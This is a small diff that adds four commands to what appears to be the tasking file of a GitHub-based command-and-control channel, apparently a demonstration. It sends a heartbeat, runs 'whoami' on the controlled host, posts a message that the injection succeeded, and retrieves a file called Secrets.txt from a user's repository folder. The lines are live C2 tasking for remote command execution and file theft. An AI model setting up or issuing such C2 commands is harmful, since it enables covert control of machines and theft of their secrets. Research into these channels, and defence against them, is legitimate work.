@@ -1,0 +1,4 @@
+alive
+cmd:whoami
+msg:CRT DEMO - Injection successful - GitHub C2 is working!
+get C:\Users\Dima\source\repos\Evil\Demo\Secrets.txt
